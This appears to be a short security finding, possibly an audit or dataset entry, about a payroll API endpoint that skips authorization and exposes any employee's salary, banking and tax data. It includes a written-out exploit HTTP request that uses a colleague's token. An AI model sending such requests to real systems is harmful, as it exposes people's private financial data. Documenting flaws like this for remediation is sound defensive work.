diagnosis: The route navigates the 1-to-1 employee.payroll_profile relationship using an unvalidated staff_id path parameter. Any authenticated user can read salary, banking routing numbers, and tax withholding figures for any employee without checking if the user is the employee themselves or an authorized HR administrator.
exploit_request:
GET /api/v1/staff/3fa85f64-5717-4562-b3fc-2c963f66afa6/compensation-breakdown HTTP/1.1
Host: api.example.com
Authorization: Bearer <colleague_jwt>
